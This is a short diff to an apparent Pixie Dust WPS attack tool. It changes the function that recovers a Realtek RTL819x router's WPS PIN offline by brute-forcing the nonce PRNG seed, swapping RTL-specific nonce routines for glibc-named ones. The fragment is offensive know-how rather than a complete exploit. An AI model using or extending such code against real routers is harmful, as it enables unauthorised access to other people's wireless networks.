@@ -129,7 +129,7 @@ def _recover_rtl819x(bundle: PixieBundle, rtl_window: Optional[Tuple[int, int]])
     if nonce[0] & 0x80 or nonce[4] & 0x80 or nonce[8] & 0x80 or nonce[12] & 0x80:
         return None
     start, end = rtl_window if rtl_window is not None else _default_rtl_window()
-    nonce_seed = pixie_prng.rtl_find_nonce_seed(nonce, start, end)
+    nonce_seed = pixie_prng.find_glibc_nonce_seed(nonce, start, end)
     if nonce_seed is None:
         return None
 
@@ -138,7 +138,7 @@ def _recover_rtl819x(bundle: PixieBundle, rtl_window: Optional[Tuple[int, int]])
     for dist in range(_RTL_ES1_SPAN + 1):
         candidates = (nonce_seed,) if dist == 0 else (nonce_seed + dist, nonce_seed - dist)
         for cand in candidates:
-            found = _find_first_half(bundle, pixie_prng.rtl_nonce_fill(cand))
+            found = _find_first_half(bundle, pixie_prng.glibc_nonce(cand))
             if found is not None:
                 first4, s1_seed = found, cand
                 break
@@ -148,7 +148,7 @@ def _recover_rtl819x(bundle: PixieBundle, rtl_window: Optional[Tuple[int, int]])
         return None
 
     for j in range(_RTL_ES2_SPAN):
-        pin = _find_second_half(bundle, pixie_prng.rtl_nonce_fill(s1_seed + j), first4)
+        pin = _find_second_half(bundle, pixie_prng.glibc_nonce(s1_seed + j), first4)
         if pin is not None:
             return pin
     return None
